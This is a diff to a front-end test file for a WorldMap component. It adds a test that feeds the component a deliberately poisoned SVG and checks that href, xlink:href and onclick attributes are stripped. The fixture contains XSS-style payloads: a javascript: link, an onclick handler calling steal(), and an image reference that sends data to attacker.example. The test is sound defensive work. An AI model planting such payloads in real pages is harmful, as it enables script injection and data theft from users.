@@ -38,6 +38,29 @@ describe("WorldMap", () => {
     expect(styleEl!.textContent).not.toMatch(/path#\w+\{fill:/);
   });
 
+  it("strips href/xlink:href and on* attributes from a poisoned SVG response", async () => {
+    const POISONED_SVG =
+      '<svg viewBox="0 0 1 1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' +
+      '<a href="javascript:alert(1)"><path id="A" onclick="steal()" /></a>' +
+      '<image xlink:href="https://attacker.example/?data=x" />' +
+      "</svg>";
+    vi.stubGlobal(
+      "fetch",
+      vi.fn().mockResolvedValue({ ok: true, text: () => Promise.resolve(POISONED_SVG) }),
+    );
+
+    const { container } = render(<WorldMap />);
+    await waitFor(() => expect(container.querySelector("svg")).not.toBeNull());
+
+    const svg = container.querySelector("svg")!;
+    expect(svg.querySelector("[href]")).toBeNull();
+    expect(svg.querySelector("[onclick]")).toBeNull();
+    const image = svg.querySelector("image");
+    expect(image).not.toBeNull();
+    expect(image!.hasAttribute("xlink:href")).toBe(false);
+    expect(image!.getAttributeNS("http://www.w3.org/1999/xlink", "href")).toBeNull();
+  });
+
   it("omits Antarctica from the checked-in atlas asset", () => {
     const svg = readFileSync(resolve("public/maps/world-countries.svg"), "utf8");
     expect(svg).not.toContain('id="AQ"');
